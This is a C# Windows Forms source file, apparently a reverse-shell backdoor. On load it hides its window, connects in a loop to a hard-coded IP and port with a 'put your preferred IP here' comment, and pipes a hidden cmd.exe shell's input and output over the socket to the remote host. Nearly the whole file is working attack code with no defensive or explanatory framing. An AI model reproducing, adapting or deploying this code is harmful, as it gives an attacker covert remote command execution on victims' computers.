/*
 * Created by SharpDevelop.
 * User: Rodrino
 * Date: 21/12/2021
 * Time: 18:37
 * 
 * To change this template use Tools | Options | Coding | Edit Standard Headers.
 */
using System; 
using System.Collections.Generic; 
using System.ComponentModel; 
using System.Data; 
using System.Drawing; 
using System.Text; 
using System.Windows.Forms; 
using System.Net.Sockets; 
using System.IO; //for Streams 
using System.Diagnostics; //for Process 


namespace server
{
	/// <summary>
	/// Description of MainForm.
	/// </summary>
	public partial class MainForm : Form
	{TcpClient tcpClient; 
      NetworkStream networkStream; 
      StreamWriter streamWriter; 
      StreamReader streamReader; 
      Process processCmd; 
      StringBuilder strInput; 
		public MainForm()
		{
			
			//
			// The InitializeComponent() call is required for Windows Forms designer support.
			//
			InitializeComponent();
			
			//
			// TODO: Add constructor code after the InitializeComponent() call.
			//
		}
		
		void MainFormLoad(object sender, EventArgs e)
		{
			
		}
		
		void MainFormShown(object sender, EventArgs e)
		{
			 this.Hide(); 
         for(;;) 
         { 
            RunServer(); 
            System.Threading.Thread.Sleep(5000); //Wait 5 seconds 
         }  
		}
		  private void RunServer() 
      { 
         tcpClient = new TcpClient(); 
         strInput = new StringBuilder(); 
         if(!tcpClient.Connected) 
         { 
            try 
            { 
               tcpClient.Connect("192.168.0.52", 8080); 
               //put your preferred IP here
               networkStream = tcpClient.GetStream(); 
               streamReader = new StreamReader(networkStream); 
               streamWriter = new StreamWriter(networkStream); 
            } 
            catch (Exception err) { return; } //if no Client don't 
                                              //continue 
            processCmd = new Process(); 
            processCmd.StartInfo.FileName = "cmd.exe"; 
            processCmd.StartInfo.CreateNoWindow = true; 
            processCmd.StartInfo.UseShellExecute = false; 
            processCmd.StartInfo.RedirectStandardOutput = true; 
            processCmd.StartInfo.RedirectStandardInput = true; 
            processCmd.StartInfo.RedirectStandardError = true; 
            processCmd.OutputDataReceived += new 
            DataReceivedEventHandler(CmdOutputDataHandler); 
            processCmd.Start(); 
            processCmd.BeginOutputReadLine(); 
         } 
         while (true) 
         { 
            try 
            { 
               strInput.Append(streamReader.ReadLine()); 
               strInput.Append("\n"); 
               if(strInput.ToString().LastIndexOf(
                   "terminate") >= 0) StopServer(); 
               if(strInput.ToString().LastIndexOf(
                   "exit") >= 0) throw new ArgumentException(); 
               processCmd.StandardInput.WriteLine(strInput); 
               strInput.Remove(0, strInput.Length); 
            } 
            catch (Exception err) 
            { 
               Cleanup(); 
               break; 
            } 
         } 
      }
		  private void Cleanup() 
      { 
         try { processCmd.Kill(); } catch (Exception err) { }; 
         streamReader.Close(); 
         streamWriter.Close(); 
         networkStream.Close(); 
      }
 
      private void StopServer() 
      { 
         Cleanup(); 
         System.Environment.Exit(System.Environment.ExitCode); 
      }
 
      private void CmdOutputDataHandler(object sendingProcess,
          DataReceivedEventArgs outLine) 
      { 
         StringBuilder strOutput = new StringBuilder(); 
         if(!String.IsNullOrEmpty(outLine.Data)) 
         { 
             try 
             { 
                strOutput.Append(outLine.Data); 
                streamWriter.WriteLine(strOutput); 
                streamWriter.Flush(); 
             } 
             catch (Exception err) { } 
         } 
      }
	}
}
